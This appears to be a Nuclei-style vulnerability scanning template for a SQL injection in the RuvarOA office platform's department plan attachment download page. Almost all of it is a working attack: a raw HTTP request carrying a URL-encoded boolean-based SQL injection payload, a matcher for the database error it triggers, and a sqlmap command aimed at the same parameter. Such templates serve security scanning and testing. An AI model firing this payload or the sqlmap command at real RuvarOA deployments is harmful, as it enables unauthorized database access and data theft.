id: RuvarOA-download-sqli
info:
  name: Template Name
  author: apple
  severity: high
  description: RuvarOA协同办公平台12处存在SQL注入漏洞
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |+
        GET //DepartmentPlan/department_plan_attach_download.aspx?sys_file_storage_id=1%27)%20AND%209447%20IN%20(SELECT%20(CHAR(113)+CHAR(112)+CHAR(122)+CHAR(112)+CHAR(113)+(SELECT%20(CASE%20WHEN%20(9447=9447)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(98)+CHAR(113)))%20AND%20(%27mnBO%27=%27mnBO HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: keep-alive

    matchers:
      - type: word
        part: body
        words:
          - '附近有语法错误'
#sqlmap.py -u "http://xxxx//DepartmentPlan/department_plan_attach_download.aspx?sys_file_storage_id=1"